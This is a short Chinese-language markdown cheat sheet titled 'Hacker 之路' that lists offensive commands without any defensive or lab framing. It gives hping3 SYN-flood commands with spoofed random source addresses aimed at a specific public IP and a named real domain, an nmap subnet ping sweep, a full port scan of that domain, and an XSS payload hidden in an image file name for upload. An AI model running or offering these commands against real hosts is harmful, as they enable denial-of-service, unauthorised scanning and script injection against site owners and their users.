## Hacker 之路  
  
### hping3洪水攻击  
  
```shell  
sudo hping3 --flood -S --rand-source -p 80 121.42.155.69  
sudo hping3 -c 100000 -d 120 -S -w 64 -p 80 --flood --rand-source www.integle.com  
```  
  
### 扫描指定网段存活的主机  
  
```shell  
sudo nmap -sP -Pl -PT 192.168.1.0/24  
```  
  
### 端口服务扫描  
  
```shell  
sudo nmap www.integle.com -p0-65535  
```  
  
### XSS图片上传  

```html  
"><img src=x onerror=alert(location.href)>.jpg  
```  
